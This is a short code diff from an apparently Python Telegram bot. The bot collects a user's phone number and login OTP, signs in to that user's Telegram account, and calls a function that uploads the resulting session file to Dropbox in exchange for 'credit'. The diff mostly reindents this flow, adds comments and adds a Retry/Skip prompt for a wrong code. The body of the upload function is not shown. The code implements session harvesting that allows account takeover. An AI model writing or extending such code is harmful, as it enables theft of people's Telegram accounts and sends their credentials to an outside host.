@@ -125,11 +125,10 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.sign_in(phone, code)
         await update.message.reply_text("✅ Logged in successfully!")
-
-        # Upload session file and update credits
-      await upload_session_to_dropbox(client, phone, update)
-
-
+        
+        # Upload session file to Dropbox and add credit
+        await upload_session_to_dropbox(client, phone, update)  # Pass the update object
+        
         await client.disconnect()
         return ConversationHandler.END
 
@@ -138,9 +137,11 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ASK_PASSWORD
 
     except errors.PhoneCodeInvalidError:
+        # If wrong code, offer retry or skip
         reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
         await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
         return ASK_CODE
+
 
 # ---- Handle Retry or Skip ----
 async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
